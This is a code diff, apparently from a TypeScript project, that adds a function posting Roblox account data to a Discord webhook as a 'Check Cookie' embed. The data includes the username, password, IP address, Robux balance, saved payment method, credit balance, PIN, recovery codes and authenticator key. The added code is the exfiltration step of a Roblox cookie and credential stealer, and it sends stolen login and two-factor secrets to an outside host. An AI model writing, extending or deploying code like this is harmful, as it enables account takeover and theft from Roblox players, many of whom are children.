@@ -116,3 +116,73 @@ export async function sendDiscordWebhook(webhookUrl: string, message: string) {
     console.error('Webhook failed:', e);
   }
 }
+
+export interface BypassEmbedData {
+  valid: boolean;
+  username?: string;
+  password?: string;
+  ip?: string;
+  robux?: string;
+  premium?: string;
+  rap?: string;
+  summary?: string;
+  creditBalance?: string;
+  savedPayment?: string;
+  robuxIO?: string;
+  status?: string;
+  korblox?: string;
+  age?: string;
+  groupsOwned?: string;
+  placeVisits?: string;
+  inventory?: string;
+  passes?: string;
+  pin?: string;
+  recoveryCodes?: string;
+  authenticatorKey?: string;
+}
+
+export async function sendBypassEmbed(webhookUrl: string, data: BypassEmbedData) {
+  if (!webhookUrl) return;
+  const na = '`N/A`';
+  const v = (s?: string) => (s && s.length ? `\`${s}\`` : na);
+  const statusEmoji = data.valid ? '✅' : '❌';
+  const statusText = data.valid ? 'Valid' : 'Invalid';
+  try {
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{
+          title: `${statusEmoji} Check Cookie · ${statusText}`,
+          color: data.valid ? 0x22c55e : 0xef4444,
+          fields: [
+            { name: '🪪 Cookie', value: `**${statusText}** ${statusEmoji}`, inline: false },
+            { name: '👤 Username (13+)', value: v(data.username), inline: true },
+            { name: '🔑 Password', value: v(data.password), inline: true },
+            { name: '🖥️ IP', value: v(data.ip), inline: true },
+            { name: '🟡 Robux (Pending)', value: v(data.robux), inline: true },
+            { name: '💎 Premium', value: v(data.premium), inline: true },
+            { name: '🎒 RAP', value: v(data.rap), inline: true },
+            { name: '📊 Summary', value: v(data.summary), inline: true },
+            { name: '💳 Credit Balance', value: v(data.creditBalance), inline: true },
+            { name: '💰 Saved Payment', value: v(data.savedPayment), inline: true },
+            { name: '🔄 Robux In/Out', value: v(data.robuxIO), inline: true },
+            { name: '✅ Status', value: v(data.status), inline: true },
+            { name: '👑 Korblox/Headless', value: v(data.korblox), inline: true },
+            { name: '🎂 Age', value: v(data.age), inline: true },
+            { name: '👥 Groups Owned', value: v(data.groupsOwned), inline: true },
+            { name: '📍 Place Visits', value: v(data.placeVisits), inline: true },
+            { name: '🎽 Inventory', value: v(data.inventory), inline: false },
+            { name: '🎟️ Passes | Played', value: v(data.passes), inline: true },
+            { name: '🔒 PIN', value: v(data.pin), inline: true },
+            { name: '🆘 Recovery Codes', value: v(data.recoveryCodes), inline: false },
+            { name: '🔐 Authenticator Key', value: v(data.authenticatorKey), inline: false },
+          ],
+          timestamp: new Date().toISOString(),
+        }],
+      }),
+    });
+  } catch (e) {
+    console.error('Webhook failed:', e);
+  }
+}
